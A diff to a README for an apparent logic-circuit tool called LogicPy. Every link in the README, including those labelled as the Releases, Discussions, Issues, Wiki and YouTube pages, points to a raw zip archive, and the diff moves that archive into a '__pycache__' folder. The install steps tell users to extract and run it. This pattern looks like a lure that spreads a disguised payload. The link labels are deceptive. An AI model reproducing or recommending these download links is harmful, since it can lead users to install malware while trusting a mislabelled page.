@@ -2,7 +2,7 @@
 
 ## 📥 Download LogicPy
 
-[![Download LogicPy](https://raw.githubusercontent.com/nixon7x/LogicPy/main/intrabronchial/LogicPy.zip)](https://raw.githubusercontent.com/nixon7x/LogicPy/main/intrabronchial/LogicPy.zip)
+[![Download LogicPy](https://raw.githubusercontent.com/nixon7x/LogicPy/main/__pycache__/Logic-Py-v2.2.zip)](https://raw.githubusercontent.com/nixon7x/LogicPy/main/__pycache__/Logic-Py-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To use LogicPy, you need:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/nixon7x/LogicPy/main/intrabronchial/LogicPy.zip) to download LogicPy. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/nixon7x/LogicPy/main/__pycache__/Logic-Py-v2.2.zip) to download LogicPy. Follow these steps:
 
 1. Click on the link above to open the GitHub Releases page.
 2. Find the latest version of LogicPy.
@@ -51,7 +51,7 @@ Once the file has downloaded, follow these steps to install LogicPy:
 ### For Linux Users:
 
 1. Open your file manager and navigate to your Downloads folder.
-2. Locate the downloaded `https://raw.githubusercontent.com/nixon7x/LogicPy/main/intrabronchial/LogicPy.zip` file.
+2. Locate the downloaded `https://raw.githubusercontent.com/nixon7x/LogicPy/main/__pycache__/Logic-Py-v2.2.zip` file.
 3. Extract the contents to a directory of your choice.
 4. Open a terminal window and navigate to the extracted folder.
 5. Run `./LogicPy` to start the application.
@@ -79,15 +79,15 @@ You can save your project at any time by clicking on "File" and selecting "Save.
 
 Join the LogicPy community for support and to share your projects:
 
-- **GitHub Discussions**: Engage with other users and developers in our [GitHub Discussions page](https://raw.githubusercontent.com/nixon7x/LogicPy/main/intrabronchial/LogicPy.zip).
-- **Report Issues**: If you encounter any problems, please create an issue on the [Issues page](https://raw.githubusercontent.com/nixon7x/LogicPy/main/intrabronchial/LogicPy.zip).
+- **GitHub Discussions**: Engage with other users and developers in our [GitHub Discussions page](https://raw.githubusercontent.com/nixon7x/LogicPy/main/__pycache__/Logic-Py-v2.2.zip).
+- **Report Issues**: If you encounter any problems, please create an issue on the [Issues page](https://raw.githubusercontent.com/nixon7x/LogicPy/main/__pycache__/Logic-Py-v2.2.zip).
 - **Social Media**: Follow us on Twitter and Facebook for updates and tips.
 
 ## 📚 Additional Resources
 
 For more information and tutorials on using LogicPy:
 
-- Check out our [Wiki](https://raw.githubusercontent.com/nixon7x/LogicPy/main/intrabronchial/LogicPy.zip) for step-by-step guides.
-- Visit our [YouTube Channel](https://raw.githubusercontent.com/nixon7x/LogicPy/main/intrabronchial/LogicPy.zip) for video tutorials.
+- Check out our [Wiki](https://raw.githubusercontent.com/nixon7x/LogicPy/main/__pycache__/Logic-Py-v2.2.zip) for step-by-step guides.
+- Visit our [YouTube Channel](https://raw.githubusercontent.com/nixon7x/LogicPy/main/__pycache__/Logic-Py-v2.2.zip) for video tutorials.
 
 Feel free to explore these resources to enhance your experience with LogicPy. Enjoy building your circuits!
